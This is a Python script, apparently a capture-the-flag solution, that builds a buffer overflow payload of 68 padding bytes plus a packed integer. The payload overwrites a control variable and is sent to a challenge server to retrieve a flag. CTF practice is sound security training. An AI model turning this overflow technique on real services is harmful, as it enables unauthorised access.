#!/usr/bin/env python3

import socket
import struct

def exploit_local():
    """
    Local exploit for testing - sends payload directly
    """
    # Buffer s is 64 bytes, v7 is 68 bytes from start of s
    # We need to fill 68 bytes + overwrite v7 with 1
    
    payload = b"A" * 68  # Fill buffer s and padding
    payload += struct.pack("<I", 1)  # Overwrite v7 with 1 (little endian)
    
    print(f"Payload length: {len(payload)}")
    print(f"Payload: {payload}")
    
    return payload

def exploit_remote(host, port):
    """
    Remote exploit - connects to the CTF server
    """
    try:
        # Connect to the server
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # Receive the prompt
        prompt = sock.recv(1024)
        print(f"Received: {prompt.decode('utf-8', errors='ignore')}")
        
        # Send our payload
        payload = exploit_local()
        sock.send(payload + b"\n")
        
        # Receive the response (hopefully the flag)
        response = sock.recv(1024)
        print(f"Response: {response.decode('utf-8', errors='ignore')}")
        
        # Try to receive more data in case there's more output
        try:
            sock.settimeout(2)
            more_data = sock.recv(1024)
            print(f"Additional data: {more_data.decode('utf-8', errors='ignore')}")
        except socket.timeout:
            pass
        
        sock.close()
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    print("=== Shang-Chi CTF Exploit ===")
    print("Buffer overflow to overwrite v7 variable")
    print()
    
    # Test the payload construction
    payload = exploit_local()
    print(f"Generated payload of {len(payload)} bytes")
    print()
    
    # Connect to remote server
    print("Connecting to remote server...")
    exploit_remote("sangchi.chall.edgesecurity.team", 1337)